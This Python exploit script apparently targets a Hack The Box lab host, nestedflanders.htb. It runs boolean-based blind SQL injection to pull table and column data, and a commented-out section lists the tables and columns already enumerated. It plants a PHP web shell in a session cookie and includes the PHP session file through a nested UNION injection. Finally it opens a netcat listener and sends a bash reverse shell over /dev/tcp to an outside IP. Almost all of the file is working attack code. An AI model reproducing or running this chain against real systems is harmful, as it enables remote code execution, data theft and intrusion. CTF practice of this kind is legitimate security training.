import yasqlit as ya
from pathlib import Path
import subprocess

def boolPredicate(res):
    if 'very sorry' in res.text:
        return True
    else:
        return False

def pPayload(p):
    p = p.replace('SELECT ', '', 1)
    sqli = f'465\' union select case when ({p})=1 then "main" else "contact" end-- -'
    return sqli

t = ya.Transport(payloadProcessor=pPayload, predicate=boolPredicate, requestPath='req-index.txt', useSsl=True)

def rce(cmd):
    t.client.session.cookies['webshell']='<?php system($_GET["cmd"]) ?>'
    res = t.client.session.get('https://www.nestedflanders.htb/index.php?id=25')
    wsPath = f'/var/lib/php/sessions/sess_{res.cookies["PHPSESSID"]}'
    params = {
        'id':f'465\' union select "1\' union select \'{wsPath}\'-- -"-- -',
        'cmd':cmd
        }
    res = t.client.session.get('https://www.nestedflanders.htb/index.php', params=params)
    print(res.text)
    

def pwn():

    # qry = 'select @@version' 
    # # 10.1.37-MariaDB-0+deb9u1
    # ya.boolExfiltrate(t,qry, 'mysql')
    # qry = ya.templates['mysql']['select']['tables']
    tables =  ['config', 'customers', 'employees', 'filepath', 'idname', 'offices', 'orderdetails', 'orders', 'payments', 'productlines', 'products']
    # for table in tables:
    #     qry = ya.templates['mysql']['select']['columns'].format(table=table)
    #     r = ya.boolExfiltrateList(t, qry, 'mysql')
    #     print(r)
    config = ['id', 'option_name', 'option_value']
    customers = ['customerNumber', 'customerName', 'contactLastName', 'contactFirstName', 'phone', 'addressLine1', 'addressLine2', 'city', 'state', 'postalCode', 'country', 'salesRepEmployeeNumber', 'creditLimit']
    employees = ['employeeNumber', 'lastName', 'firstName', 'extension', 'email', 'officeCode', 'reportsTo', 'jobTitle']
    filepath = ['name', 'path']
    idname = ['id', 'name', 'disabled']
    offices = ['officeCode', 'city', 'phone', 'addressLine1', 'addressLine2', 'state', 'country', 'postalCode', 'territory']
    orderdetails = ['orderNumber', 'productCode', 'quantityOrdered', 'priceEach', 'orderLineNumber']
    orders = ['orderNumber', 'orderDate', 'requiredDate', 'shippedDate', 'status', 'comments', 'customerNumber']
    payments = ['customerNumber', 'checkNumber', 'paymentDate', 'amount']
    productlines = ['productLine', 'textDescription', 'htmlDescription', 'image']
    products = ['productCode', 'productName', 'productLine', 'productScale', 'productVendor', 'productDescription', 'quantityInStock', 'buyPrice', 'MSRP']
    
    qry = 'select name from idname' # main, contact, about
    ya.boolExfiltrateList(t, qry, 'mysql')





# pwn()

p = subprocess.Popen('nc -lvp 443', shell=True)
rce('bash -c "/bin/bash -i >& /dev/tcp/10.10.14.21/443 0>&1"')
p.communicate()